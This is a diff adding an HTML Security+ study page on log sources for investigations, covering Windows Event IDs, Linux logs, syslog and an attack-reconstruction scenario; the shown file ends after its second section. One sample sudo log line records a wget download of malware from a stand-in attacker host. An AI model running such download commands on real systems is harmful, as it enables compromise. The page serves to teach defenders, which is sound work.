@@ -1,0 +1,1735 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Data Sources for Investigations — Security+ Domain 4</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Chivo+Mono:wght@300;400;600;700&family=Chivo:wght@300;400;500;600;700;900&display=swap');
+
+:root {
+  --bg:#f8f7f2;
+  --s1:#ffffff;
+  --s2:#eeede6;
+  --s3:#e4e3da;
+  --border:#d4d2c8;
+  --text:#1a190f;
+  --muted:#6e6d5e;
+  --blue:#1545c8;
+  --green:#0f6e3a;
+  --red:#b81818;
+  --orange:#b54808;
+  --purple:#6215a8;
+  --teal:#0b6e6a;
+  --yellow:#7e5e08;
+  --indigo:#2e1eb8;
+  --lime:#3a6a08;
+  --rose:#a0145a;
+  --sky:#0858b0;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:'Chivo',sans-serif;
+  font-size:14px;
+  line-height:1.65;
+  padding:2rem 1.5rem;
+}
+
+/* MASTHEAD */
+.mast{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  margin-bottom:2.5rem;
+  padding-bottom:1.8rem;
+  border-bottom:2px solid var(--text);
+  gap:0.4rem;
+}
+.mast-tag{
+  font-family:'Chivo Mono',monospace;
+  font-size:0.62rem;
+  letter-spacing:0.2em;
+  color:var(--muted);
+  text-transform:uppercase;
+}
+.mast-title{
+  font-family:'Chivo',sans-serif;
+  font-size:3rem;
+  font-weight:900;
+  line-height:0.95;
+  letter-spacing:-0.04em;
+  text-align:center;
+}
+.mast-title .accent{color:var(--indigo);}
+.mast-rule{
+  width:60px;height:3px;
+  background:var(--text);
+  margin:0.3rem 0;
+}
+.mast-sub{
+  font-family:'Chivo Mono',monospace;
+  font-size:0.65rem;
+  color:var(--muted);
+  text-align:center;
+  letter-spacing:0.04em;
+}
+
+/* TABS */
+.tabs{display:flex;flex-wrap:wrap;gap:0.3rem;justify-content:center;margin-bottom:2rem;}
+.tab{
+  padding:0.4rem 0.9rem;
+  border-radius:5px;
+  border:1.5px solid var(--border);
+  background:var(--s1);
+  color:var(--muted);
+  cursor:pointer;
+  font-family:'Chivo Mono',monospace;
+  font-size:0.63rem;
+  font-weight:600;
+  transition:all 0.14s;
+  letter-spacing:0.02em;
+}
+.tab:hover{border-color:var(--indigo);color:var(--indigo);}
+.tab.active{background:var(--indigo);color:#fff;border-color:var(--indigo);}
+
+/* SECTIONS */
+.sec{display:none;}
+.sec.on{display:block;animation:rise 0.2s ease;}
+@keyframes rise{from{opacity:0;transform:translateY(5px);}to{opacity:1;transform:none;}}
+
+/* CARD */
+.card{
+  background:var(--s1);
+  border:1.5px solid var(--border);
+  border-radius:10px;
+  margin-bottom:1.5rem;
+  overflow:hidden;
+  box-shadow:0 2px 8px rgba(0,0,0,0.04);
+}
+.card-hd{
+  display:flex;align-items:center;gap:0.8rem;
+  padding:1rem 1.4rem;
+  border-bottom:1.5px solid var(--border);
+}
+.card-num{
+  font-family:'Chivo Mono',monospace;
+  font-size:0.58rem;
+  color:var(--muted);
+  background:var(--s2);
+  border:1px solid var(--border);
+  border-radius:3px;
+  padding:0.12rem 0.38rem;
+}
+.card-title{
+  font-family:'Chivo',sans-serif;
+  font-size:1.1rem;
+  font-weight:700;
+  letter-spacing:-0.02em;
+}
+.bdg{
+  margin-left:auto;
+  font-family:'Chivo Mono',monospace;
+  font-size:0.58rem;
+  padding:0.15rem 0.55rem;
+  border-radius:3px;
+  white-space:nowrap;
+  font-weight:600;
+  letter-spacing:0.02em;
+}
+.bdg-blue{background:#dbeafe;color:#1e40af;border:1px solid #93c5fd;}
+.bdg-green{background:#dcfce7;color:#166534;border:1px solid #86efac;}
+.bdg-orange{background:#ffedd5;color:#9a3412;border:1px solid #fdba74;}
+.bdg-red{background:#fee2e2;color:#991b1b;border:1px solid #fca5a5;}
+.bdg-purple{background:#f3e8ff;color:#6b21a8;border:1px solid #d8b4fe;}
+.bdg-teal{background:#ccfbf1;color:#115e59;border:1px solid #5eead4;}
+.bdg-indigo{background:#e0e7ff;color:#3730a3;border:1px solid #a5b4fc;}
+.bdg-yellow{background:#fef9c3;color:#713f12;border:1px solid #fde047;}
+.bdg-lime{background:#ecfccb;color:#3f6212;border:1px solid #bef264;}
+.bdg-sky{background:#e0f2fe;color:#075985;border:1px solid #7dd3fc;}
+
+.card-bd{padding:1.4rem;}
+p{color:var(--muted);font-size:0.85rem;margin-bottom:0.8rem;line-height:1.7;}
+h3{
+  font-family:'Chivo',sans-serif;
+  font-size:0.92rem;
+  font-weight:700;
+  color:var(--text);
+  margin:1.2rem 0 0.6rem;
+  padding-left:0.7rem;
+  border-left:3px solid var(--indigo);
+  letter-spacing:-0.01em;
+}
+
+/* CODE */
+.code{
+  background:var(--text);
+  color:#eeecd8;
+  border-radius:6px;
+  padding:1rem 1.2rem;
+  font-family:'Chivo Mono',monospace;
+  font-size:0.68rem;
+  line-height:1.9;
+  overflow-x:auto;
+  margin:0.8rem 0;
+}
+.cg{color:#86efac;} .cr{color:#fca5a5;} .cb{color:#93c5fd;}
+.co{color:#fde047;} .cp{color:#d8b4fe;} .cm{color:#6e6d5e;}
+.ct{color:#5eead4;} .ci{color:#a5b4fc;} .cy{color:#fef08a;}
+.cl{color:#bef264;} .cpk{color:#f9a8d4;} .cs{color:#7dd3fc;}
+
+/* SCENE */
+.scene{
+  background:#fffbeb;
+  border-left:3px solid var(--orange);
+  border-radius:0 6px 6px 0;
+  padding:1rem 1.2rem;
+  margin:1rem 0;
+}
+.scene-lbl{
+  font-family:'Chivo Mono',monospace;
+  font-size:0.58rem;
+  color:var(--orange);
+  margin-bottom:0.4rem;
+  letter-spacing:0.12em;
+  font-weight:700;
+  text-transform:uppercase;
+}
+
+/* GRIDS */
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:0.8rem;margin:0.8rem 0;}
+.g3{display:grid;grid-template-columns:repeat(3,1fr);gap:0.8rem;margin:0.8rem 0;}
+.g4{display:grid;grid-template-columns:repeat(4,1fr);gap:0.7rem;margin:0.8rem 0;}
+@media(max-width:640px){.g2,.g3,.g4{grid-template-columns:1fr;}}
+
+.gc{
+  background:var(--s2);
+  border:1.5px solid var(--border);
+  border-radius:8px;
+  padding:1rem;
+}
+.gc h4{font-size:0.84rem;font-weight:700;margin-bottom:0.4rem;letter-spacing:-0.01em;}
+.gc p{font-size:0.77rem;margin:0;}
+.gc ul{padding-left:1rem;margin-top:0.3rem;}
+.gc ul li{font-size:0.76rem;color:var(--muted);margin-bottom:0.25rem;}
+
+/* EXAM */
+.exam{
+  background:#f0eeff;
+  border:1.5px solid #c4b5fd;
+  border-radius:8px;
+  padding:1rem 1.2rem;
+  margin-top:1rem;
+}
+.exam h4{
+  font-family:'Chivo Mono',monospace;
+  font-size:0.58rem;
+  color:var(--purple);
+  margin-bottom:0.6rem;
+  letter-spacing:0.12em;
+  font-weight:700;
+  text-transform:uppercase;
+}
+.er{display:flex;gap:0.5rem;margin-bottom:0.38rem;font-size:0.79rem;align-items:flex-start;}
+.ek{color:var(--purple);font-family:'Chivo Mono',monospace;font-size:0.65rem;flex-shrink:0;font-weight:700;}
+
+/* TABLE */
+table{width:100%;border-collapse:collapse;font-size:0.78rem;}
+th{
+  background:var(--s2);padding:0.52rem 0.8rem;text-align:left;
+  color:var(--muted);border-bottom:1.5px solid var(--border);
+  font-size:0.64rem;font-weight:700;
+  font-family:'Chivo Mono',monospace;letter-spacing:0.05em;text-transform:uppercase;
+}
+td{padding:0.52rem 0.8rem;border-bottom:1px solid var(--border);}
+tr:last-child td{border-bottom:none;}
+tr:hover td{background:var(--s2);}
+
+.tag{display:inline-block;padding:0.08rem 0.42rem;border-radius:3px;font-size:0.6rem;font-family:'Chivo Mono',monospace;font-weight:700;}
+.tg{background:#dcfce7;color:#166534;}
+.tr{background:#fee2e2;color:#991b1b;}
+.tb{background:#dbeafe;color:#1e40af;}
+.to{background:#ffedd5;color:#9a3412;}
+.tp{background:#f3e8ff;color:#6b21a8;}
+.tt{background:#ccfbf1;color:#115e59;}
+.ti{background:#e0e7ff;color:#3730a3;}
+.ty{background:#fef9c3;color:#713f12;}
+.tl{background:#ecfccb;color:#3f6212;}
+.ts{background:#e0f2fe;color:#075985;}
+
+/* LOG SOURCE CARDS */
+.log-card{
+  background:var(--s1);
+  border:1.5px solid var(--border);
+  border-radius:8px;
+  padding:1.1rem;
+  margin-bottom:0.7rem;
+  border-left:4px solid;
+}
+.log-hd{display:flex;align-items:center;gap:0.7rem;margin-bottom:0.5rem;}
+.log-icon{font-size:1.2rem;flex-shrink:0;}
+.log-name{font-size:0.88rem;font-weight:700;letter-spacing:-0.01em;}
+.log-badge{font-family:'Chivo Mono',monospace;font-size:0.58rem;color:var(--muted);background:var(--s2);padding:0.12rem 0.4rem;border-radius:3px;margin-left:auto;}
+.log-body{font-size:0.78rem;color:var(--muted);}
+
+/* WINDOWS EVENT IDS */
+.eid-row{
+  display:flex;align-items:center;gap:0.8rem;
+  padding:0.55rem 0.9rem;
+  background:var(--s2);border:1px solid var(--border);border-radius:6px;
+  margin-bottom:0.35rem;
+}
+.eid-num{
+  font-family:'Chivo Mono',monospace;font-size:0.78rem;font-weight:700;
+  min-width:50px;flex-shrink:0;
+}
+.eid-name{font-size:0.82rem;font-weight:600;min-width:180px;flex-shrink:0;}
+.eid-use{font-size:0.74rem;color:var(--muted);flex:1;}
+.eid-sev{white-space:nowrap;}
+
+/* FLOW */
+.flow{display:flex;align-items:center;flex-wrap:wrap;gap:0.4rem;margin:1rem 0;}
+.flow-box{
+  border-radius:5px;padding:0.5rem 0.75rem;
+  font-family:'Chivo Mono',monospace;font-size:0.65rem;font-weight:600;
+  border:1.5px solid;text-align:center;min-width:80px;
+}
+.flow-arr{color:var(--muted);font-size:0.9rem;}
+
+/* INVESTIGATION TIMELINE */
+.inv-row{
+  display:flex;gap:1rem;padding:0.7rem 0;
+  border-bottom:1px solid var(--border);align-items:flex-start;
+}
+.inv-row:last-child{border-bottom:none;}
+.inv-time{
+  font-family:'Chivo Mono',monospace;font-size:0.68rem;font-weight:700;
+  min-width:65px;flex-shrink:0;color:var(--indigo);
+}
+.inv-source{
+  font-size:0.72rem;font-weight:700;min-width:120px;flex-shrink:0;
+}
+.inv-detail{font-size:0.74rem;color:var(--muted);}
+
+/* INFO ROW */
+.info-row{
+  display:flex;align-items:flex-start;gap:0.8rem;
+  padding:0.8rem 1rem;background:var(--s2);
+  border:1.5px solid var(--border);border-radius:7px;margin-bottom:0.5rem;
+}
+.info-icon{font-size:1rem;flex-shrink:0;margin-top:0.1rem;}
+.info-title{font-size:0.84rem;font-weight:700;margin-bottom:0.12rem;letter-spacing:-0.01em;}
+.info-desc{font-size:0.74rem;color:var(--muted);}
+
+/* SYSLOG SEVERITY */
+.sev-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:0.5rem;margin:1rem 0;}
+@media(max-width:600px){.sev-grid{grid-template-columns:1fr 1fr;}}
+.sev-cell{border-radius:6px;padding:0.7rem;border:1.5px solid;text-align:center;}
+.sev-num{font-family:'Chivo Mono',monospace;font-size:1.1rem;font-weight:700;margin-bottom:0.2rem;}
+.sev-name{font-size:0.72rem;font-weight:700;margin-bottom:0.15rem;}
+.sev-desc{font-size:0.64rem;color:var(--muted);}
+</style>
+</head>
+<body>
+
+<div class="mast">
+  <div class="mast-tag">CompTIA Security+ SY0-701 — Domain 4 · Security Operations</div>
+  <div class="mast-title">Data <span class="accent">Sources</span><br>for Investigations</div>
+  <div class="mast-rule"></div>
+  <div class="mast-sub">// Log Data · System Logs · Network Logs · Application Logs · Cloud Logs · Metadata · SIEM</div>
+</div>
+
+<div class="tabs">
+  <button class="tab active" onclick="go('s1',this)">1. Overview</button>
+  <button class="tab" onclick="go('s2',this)">2. System Logs</button>
+  <button class="tab" onclick="go('s3',this)">3. Network Logs</button>
+  <button class="tab" onclick="go('s4',this)">4. App & Service Logs</button>
+  <button class="tab" onclick="go('s5',this)">5. Cloud & Identity</button>
+  <button class="tab" onclick="go('s6',this)">6. Endpoint Logs</button>
+  <button class="tab" onclick="go('s7',this)">7. Metadata & Context</button>
+  <button class="tab" onclick="go('s8',this)">8. SIEM Correlation</button>
+  <button class="tab" onclick="go('s9',this)">📊 Summary</button>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 1. OVERVIEW               -->
+<!-- ══════════════════════════ -->
+<div class="sec on" id="s1">
+<div class="card">
+  <div class="card-hd"><span class="card-num">01</span><span class="card-title">Why Data Sources Matter for Investigations</span><span class="bdg bdg-indigo">Evidence · Visibility · Context</span></div>
+  <div class="card-bd">
+    <p>Security investigations depend entirely on <strong style="color:var(--text)">data — logs, telemetry, metadata, and captured traffic</strong>. Without the right data sources, analysts are blind. With comprehensive data collection, every attacker action leaves a trail. The question is whether you were collecting the right data before the incident occurred.</p>
+
+    <h3>The Fundamental Investigation Challenge</h3>
+    <div class="code">
+<span class="cm"># The bitter truth about investigations:</span>
+
+Incident discovered today:
+  Question: "How did attacker get in 6 weeks ago?"
+  
+  Without logging:     <span class="cr">"We don't know — no logs"</span>
+  With short retention: <span class="cr">"Logs only kept 7 days — gone"</span>
+  With gaps in coverage: <span class="cr">"That server wasn't logging — blind spot"</span>
+  With full coverage:   <span class="cg">"Timeline reconstructed — found it ✓"</span>
+
+<span class="cm"># Data collection must happen BEFORE the incident</span>
+<span class="cm"># You can't go back in time and add logging</span>
+<span class="cm"># What you collect today is what saves you tomorrow</span>
+
+Common investigation failures:
+  <span class="cr">×</span> "We don't log that system — it's legacy"
+  <span class="cr">×</span> "Log retention was only 14 days — data overwritten"
+  <span class="cr">×</span> "No network capture on that segment"
+  <span class="cr">×</span> "DNS logs not enabled on that server"
+  <span class="cr">×</span> "Command-line auditing wasn't turned on"
+  <span class="cr">×</span> "Cloud API logs weren't configured"
+    </div>
+
+    <h3>Data Source Categories</h3>
+    <div class="g3">
+      <div class="gc" style="border-color:#bfdbfe">
+        <h4 style="color:var(--blue)">🖥️ System Logs</h4>
+        <p>OS-level events — authentication, process execution, privilege use, system changes. Windows Event Log, Linux syslog, macOS Unified Log. Covered in Tab 2.</p>
+      </div>
+      <div class="gc" style="border-color:#bbf7d0">
+        <h4 style="color:var(--green)">📡 Network Logs</h4>
+        <p>Firewall logs, NetFlow, packet captures, DNS queries, DHCP assignments, proxy logs. Show who talked to whom. Covered in Tab 3.</p>
+      </div>
+      <div class="gc" style="border-color:#fed7aa">
+        <h4 style="color:var(--orange)">📦 Application Logs</h4>
+        <p>Web server access logs, database query logs, email logs, API logs, authentication logs. What applications did. Covered in Tab 4.</p>
+      </div>
+      <div class="gc" style="border-color:#e9d5ff">
+        <h4 style="color:var(--purple)">☁️ Cloud & Identity</h4>
+        <p>AWS CloudTrail, Azure Activity Log, IAM events, SSO logs, SaaS audit trails. What happened in cloud environments. Covered in Tab 5.</p>
+      </div>
+      <div class="gc" style="border-color:#ccfbf1">
+        <h4 style="color:var(--teal)">🔬 Endpoint Telemetry</h4>
+        <p>EDR agent data — process trees, file changes, registry modifications, network connections from endpoints. Covered in Tab 6.</p>
+      </div>
+      <div class="gc" style="border-color:#fef9c3">
+        <h4 style="color:var(--yellow)">🏷️ Metadata & Context</h4>
+        <p>File metadata, email headers, image EXIF data, document properties. Often overlooked but rich in investigative value. Covered in Tab 7.</p>
+      </div>
+    </div>
+
+    <h3>Log Collection Architecture</h3>
+    <div class="code">
+<span class="cm"># Centralized collection — the correct model:</span>
+
+Log sources:                  Collection:        Analysis:
+  Windows servers ──────────→                  
+  Linux servers ────────────→                  
+  Firewalls ────────────────→  [SIEM/Log       → Correlation
+  Network devices ──────────→   Management      → Alerting
+  Web servers ──────────────→   Platform]       → Search
+  Databases ────────────────→                  → Dashboards
+  Cloud services ───────────→  (Splunk,         → Retention
+  Endpoints (EDR) ──────────→   Sentinel,        
+  Email gateway ────────────→   QRadar,          
+  Identity/SSO ─────────────→   ELK Stack)       
+
+<span class="cm"># Why centralized matters for investigations:</span>
+Attacker can delete LOCAL logs → <span class="cr">gone forever</span>
+SIEM already received logs → <span class="cg">preserved and immutable</span>
+Timeline across 50 systems → <span class="cg">correlatable in one place</span>
+Search 90 days of history → <span class="cg">seconds not hours</span>
+    </div>
+
+    <h3>Log Retention — How Long to Keep What</h3>
+    <div style="overflow-x:auto;margin:1rem 0">
+    <table>
+      <tr><th>Regulation</th><th>Log Type</th><th>Minimum Retention</th><th>Why</th></tr>
+      <tr><td><span class="tag tb">PCI-DSS</span></td><td>Audit logs — cardholder data env</td><td>1 year (3 months hot)</td><td>Req 10.7 — fraud investigation</td></tr>
+      <tr><td><span class="tag to">HIPAA</span></td><td>Access logs — PHI systems</td><td>6 years</td><td>Security rule compliance</td></tr>
+      <tr><td><span class="tag tg">SOX</span></td><td>Financial system logs</td><td>7 years</td><td>Financial reporting integrity</td></tr>
+      <tr><td><span class="tag tp">GDPR</span></td><td>Processing activity logs</td><td>As needed</td><td>Demonstrate lawful processing</td></tr>
+      <tr><td><span class="tag ti">General Best Practice</span></td><td>Security event logs</td><td>90 days hot, 1 year cold</td><td>Typical investigation window</td></tr>
+      <tr><td><span class="tag ts">Investigation tip</span></td><td>All security logs</td><td>12-24 months recommended</td><td>Dwell time avg 207 days</td></tr>
+    </table>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">Log data →</span><span>Primary evidence source for investigations — must collect BEFORE incident</span></div>
+      <div class="er"><span class="ek">Centralized logging →</span><span>SIEM collects all sources — attacker can't delete centralized logs</span></div>
+      <div class="er"><span class="ek">Log retention →</span><span>PCI=1yr / HIPAA=6yr / SOX=7yr / Best practice=90 days hot + 1 year cold</span></div>
+      <div class="er"><span class="ek">Blind spots →</span><span>Unconfigured log sources = gaps in investigation — can't reconstruct what wasn't logged</span></div>
+      <div class="er"><span class="ek">Dwell time →</span><span>Average 207 days — means logs need 12+ months retention to cover full investigation</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 2. SYSTEM LOGS            -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s2">
+<div class="card">
+  <div class="card-hd"><span class="card-num">02</span><span class="card-title">System Logs</span><span class="bdg bdg-blue">Windows · Linux · macOS</span></div>
+  <div class="card-bd">
+    <p>System logs record <strong style="color:var(--text)">OS-level activity</strong> — who logged in, what processes ran, what changed. They form the backbone of most security investigations and are often the first place analysts look.</p>
+
+    <h3>Windows Event Log — The Most Critical</h3>
+    <p>Windows records security-relevant events in structured Event Log entries, each with a unique Event ID. Knowing which IDs matter is essential for investigations and directly tested on Security+.</p>
+
+    <h3 style="border-left-color:var(--red)">Authentication Events — Must Know</h3>
+    <div class="eid-row">
+      <span class="eid-num" style="color:var(--blue)">4624</span>
+      <span class="eid-name">Successful Logon</span>
+      <span class="eid-use">Who logged in, from where, what logon type. Essential for tracking access. Logon type 3 = network, type 10 = remote interactive (RDP).</span>
+      <span class="eid-sev"><span class="tag tb">Monitor</span></span>
+    </div>
+    <div class="eid-row">
+      <span class="eid-num" style="color:var(--red)">4625</span>
+      <span class="eid-name">Failed Logon</span>
+      <span class="eid-use">Failed authentication attempt. Spike = brute force. Many accounts same time = password spray. Sub-status codes reveal why (wrong password, account locked, etc).</span>
+      <span class="eid-sev"><span class="tag tr">Alert</span></span>
+    </div>
+    <div class="eid-row">
+      <span class="eid-num" style="color:var(--orange)">4648</span>
+      <span class="eid-name">Logon with Explicit Credentials</span>
+      <span class="eid-use">Process used credentials explicitly (runas). Pass-the-hash, lateral movement indicator. Common in Mimikatz-based attacks. Flag when unexpected.</span>
+      <span class="eid-sev"><span class="tag tr">Alert</span></span>
+    </div>
+    <div class="eid-row">
+      <span class="eid-num" style="color:var(--purple)">4768</span>
+      <span class="eid-name">Kerberos TGT Requested</span>
+      <span class="eid-use">Authentication service ticket requested. Used for: Kerberoasting detection, pass-the-ticket attacks, golden ticket detection. Failure code 0x12 = account disabled.</span>
+      <span class="eid-sev"><span class="tag tp">Watch</span></span>
+    </div>
+    <div class="eid-row">
+      <span class="eid-num" style="color:var(--purple)">4769</span>
+      <span class="eid-name">Kerberos Service Ticket Requested</span>
+      <span class="eid-use">Service ticket requested for specific resource. Kerberoasting: bulk 4769 events for service accounts with RC4 encryption. Mass requests = credential harvesting.</span>
+      <span class="eid-sev"><span class="tag tr">Alert</span></span>
+    </div>
+
+    <h3 style="border-left-color:var(--orange)">Account Management Events</h3>
+    <div class="eid-row">
+      <span class="eid-num" style="color:var(--red)">4720</span>
+      <span class="eid-name">User Account Created</span>
+      <span class="eid-use">New user account created. Unauthorized account creation = backdoor. After-hours account creation = high suspicion. Track who created it.</span>
+      <span class="eid-sev"><span class="tag tr">Alert</span></span>
+    </div>
+    <div class="eid-row">
+      <span class="eid-num" style="color:var(--red)">4722</span>
+      <span class="eid-name">User Account Enabled</span>
+      <span class="eid-use">Disabled account re-enabled. Orphaned account reactivated = potential attacker using old account. Correlate with who enabled it and when.</span>
+      <span class="eid-sev"><span class="tag tr">Alert</span></span>
+    </div>
+    <div class="eid-row">
+      <span class="eid-num" style="color:var(--red)">4732</span>
+      <span class="eid-name">Added to Security Group</span>
+      <span class="eid-use">User added to privileged group (Domain Admins, local Admins). Privilege escalation indicator. Alert immediately for Domain Admins group changes.</span>
+      <span class="eid-sev"><span class="tag tr">Critical</span></span>
+    </div>
+
+    <h3 style="border-left-color:var(--purple)">Privileged Activity Events</h3>
+    <div class="eid-row">
+      <span class="eid-num" style="color:var(--purple)">4672</span>
+      <span class="eid-name">Special Privileges Assigned</span>
+      <span class="eid-use">Logon with sensitive privileges (admin logon). Every admin session tagged with this. Unexpected admin logons = investigate. Track admin account usage.</span>
+      <span class="eid-sev"><span class="tag tp">Monitor</span></span>
+    </div>
+    <div class="eid-row">
+      <span class="eid-num" style="color:var(--orange)">4698</span>
+      <span class="eid-name">Scheduled Task Created</span>
+      <span class="eid-use">New scheduled task created — primary persistence mechanism for malware. Unexpected task by non-admin = red flag. Review task binary path carefully.</span>
+      <span class="eid-sev"><span class="tag tr">Alert</span></span>
+    </div>
+    <div class="eid-row">
+      <span class="eid-num" style="color:var(--red)">4719</span>
+      <span class="eid-name">Audit Policy Changed</span>
+      <span class="eid-use">System audit policy modified. Attacker disabling logging to cover tracks. Auditing disabled = CRITICAL ALERT — assume attacker active and trying to hide.</span>
+      <span class="eid-sev"><span class="tag tr">Critical</span></span>
+    </div>
+    <div class="eid-row">
+      <span class="eid-num" style="color:var(--red)">7045</span>
+      <span class="eid-name">New Service Installed</span>
+      <span class="eid-use">New Windows service installed. Malware persistence mechanism. Unexpected service = investigate. Service running from temp folder = high suspicion.</span>
+      <span class="eid-sev"><span class="tag tr">Alert</span></span>
+    </div>
+    <div class="eid-row">
+      <span class="eid-num" style="color:var(--orange)">4688</span>
+      <span class="eid-name">New Process Created</span>
+      <span class="eid-use">Process creation with command-line logging. Critical for detecting: malware execution, PowerShell abuse, LOLBins, lateral movement tools. Requires command-line auditing enabled.</span>
+      <span class="eid-sev"><span class="tag tb">Required</span></span>
+    </div>
+
+    <h3>Linux / Unix Logs — Key Files</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--teal)">/var/log/auth.log (Debian) or /var/log/secure (RHEL)</h4>
+        <p>All authentication events — SSH logins, sudo usage, PAM authentication. Shows: who logged in via SSH, failed attempts, sudo command execution, su usage. Most important Linux security log.</p>
+        <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+<span class="cm"># Successful SSH login:</span>
+Mar 15 02:14:33 server sshd: Accepted publickey for admin
+  from 185.220.101.34 port 54231 ssh2
+
+<span class="cm"># Sudo command (who ran what as root):</span>
+Mar 15 02:15:01 server sudo: admin : TTY=pts/0 ;
+  PWD=/home/admin ; USER=root ;
+  COMMAND=/usr/bin/wget http://evil.com/malware
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--green)">/var/log/syslog and Others</h4>
+        <ul>
+          <li><strong>/var/log/syslog</strong> — general system messages</li>
+          <li><strong>/var/log/kern.log</strong> — kernel messages (rootkits, driver issues)</li>
+          <li><strong>/var/log/cron</strong> — scheduled task execution (persistence)</li>
+          <li><strong>/var/log/dpkg.log / yum.log</strong> — software installation</li>
+          <li><strong>/var/log/wtmp</strong> — login history (binary — use <code>last</code>)</li>
+          <li><strong>/var/log/lastlog</strong> — last login per user</li>
+          <li><strong>~/.bash_history</strong> — command history (can be cleared)</li>
+        </ul>
+      </div>
+    </div>
+
+    <h3>Syslog Protocol — How Logs Are Transmitted</h3>
+    <div class="code">
+<span class="cm"># Syslog — universal log forwarding protocol:</span>
+Protocol: UDP port <span class="co">514</span>  (unencrypted — use only on trusted networks)
+          TCP port <span class="cg">6514</span>  (TLS encrypted — preferred for security logs)
+
+Syslog message format:
+<span class="cb">&lt;priority&gt;</span><span class="cg">timestamp</span> <span class="co">hostname</span> <span class="cp">app-name</span>[<span class="ct">PID</span>]: <span class="cy">message</span>
+
+Example:
+&lt;34&gt;Mar 15 02:14:33 webserver01 sshd[1234]: Failed password
+  for admin from 185.220.101.34 port 22 ssh2
+
+<span class="cm"># Priority = Facility × 8 + Severity</span>
+<span class="cm"># Facilities: 0=kernel, 4=security/auth, 10=security</span>
+<span class="cm"># Severity levels (0=Emergency to 7=Debug)</span>
+    </div>
+
+    <h3>Syslog Severity Levels</h3>
+    <div class="sev-grid">
+      <div class="sev-cell" style="background:#fee2e2;border-color:#fca5a5">
+        <div class="sev-num" style="color:var(--red)">0</div>
+        <div class="sev-name" style="color:var(--red)">Emergency</div>
+        <div class="sev-desc">System unusable</div>
+      </div>
+      <div class="sev-cell" style="background:#fee2e2;border-color:#fca5a5">
+        <div class="sev-num" style="color:var(--red)">1</div>
+        <div class="sev-name" style="color:var(--red)">Alert</div>
+        <div class="sev-desc">Action required</div>
+      </div>
+      <div class="sev-cell" style="background:#ffedd5;border-color:#fdba74">
+        <div class="sev-num" style="color:var(--orange)">2</div>
+        <div class="sev-name" style="color:var(--orange)">Critical</div>
+        <div class="sev-desc">Critical conditions</div>
+      </div>
+      <div class="sev-cell" style="background:#ffedd5;border-color:#fdba74">
+        <div class="sev-num" style="color:var(--orange)">3</div>
+        <div class="sev-name" style="color:var(--orange)">Error</div>
+        <div class="sev-desc">Error conditions</div>
+      </div>
+      <div class="sev-cell" style="background:#fef9c3;border-color:#fde047">
+        <div class="sev-num" style="color:var(--yellow)">4</div>
+        <div class="sev-name" style="color:var(--yellow)">Warning</div>
+        <div class="sev-desc">Warning conditions</div>
+      </div>
+      <div class="sev-cell" style="background:#dcfce7;border-color:#86efac">
+        <div class="sev-num" style="color:var(--green)">5</div>
+        <div class="sev-name" style="color:var(--green)">Notice</div>
+        <div class="sev-desc">Normal significant</div>
+      </div>
+      <div class="sev-cell" style="background:#dbeafe;border-color:#93c5fd">
+        <div class="sev-num" style="color:var(--blue)">6</div>
+        <div class="sev-name" style="color:var(--blue)">Info</div>
+        <div class="sev-desc">Informational</div>
+      </div>
+      <div class="sev-cell" style="background:var(--s2);border-color:var(--border)">
+        <div class="sev-num" style="color:var(--muted)">7</div>
+        <div class="sev-name" style="color:var(--muted)">Debug</div>
+        <div class="sev-desc">Debug-level msgs</div>
+      </div>
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// Scenario — Windows Event IDs Reconstruct Attack</div>
+      <div class="code">
+<span class="cm"># Reconstructing a privilege escalation attack from Windows Events:</span>
+
+<span class="ci">14:23:07</span> — <span class="cb">Event 4625</span>: Failed logon — user "sarah" — 5 times in 2 min
+              Sub-status: 0xC000006A (wrong password)
+              Source: 10.0.1.47
+
+<span class="ci">14:23:47</span> — <span class="cb">Event 4624</span>: Successful logon — user "sarah"
+              Logon Type: 3 (network)
+              Source: 10.0.1.47
+              <span class="co">→ brute force succeeded</span>
+
+<span class="ci">14:24:12</span> — <span class="cb">Event 4648</span>: Explicit credential logon
+              Account used: domain\svc_backup
+              Process: powershell.exe
+              <span class="cr">→ Pass-the-hash or credential dumping</span>
+
+<span class="ci">14:25:33</span> — <span class="cb">Event 4732</span>: User added to Administrators group
+              Added user: sarah
+              Added by: SYSTEM
+              <span class="cr">→ Privilege escalation complete</span>
+
+<span class="ci">14:27:01</span> — <span class="cb">Event 4719</span>: Audit policy changed
+              Changed by: sarah (now admin)
+              Policy: Security Event Log — DISABLED
+              <span class="cr">→ Attacker covering tracks — CRITICAL ALERT</span>
+
+<span class="cg">Five Event IDs tell the complete attack story ✓</span>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">4624 →</span><span>Successful logon — who, when, where, logon type</span></div>
+      <div class="er"><span class="ek">4625 →</span><span>Failed logon — brute force detection</span></div>
+      <div class="er"><span class="ek">4648 →</span><span>Explicit credential logon — pass-the-hash, lateral movement</span></div>
+      <div class="er"><span class="ek">4672 →</span><span>Special privileges — admin logon</span></div>
+      <div class="er"><span class="ek">4698 →</span><span>Scheduled task created — persistence mechanism</span></div>
+      <div class="er"><span class="ek">4719 →</span><span>Audit policy changed — attacker covering tracks — CRITICAL</span></div>
+      <div class="er"><span class="ek">4720 →</span><span>Account created — backdoor account detection</span></div>
+      <div class="er"><span class="ek">4732 →</span><span>Added to privileged group — privilege escalation</span></div>
+      <div class="er"><span class="ek">7045 →</span><span>New service — malware persistence</span></div>
+      <div class="er"><span class="ek">Syslog ports →</span><span>UDP 514 (insecure) / TCP 6514 (TLS — secure)</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
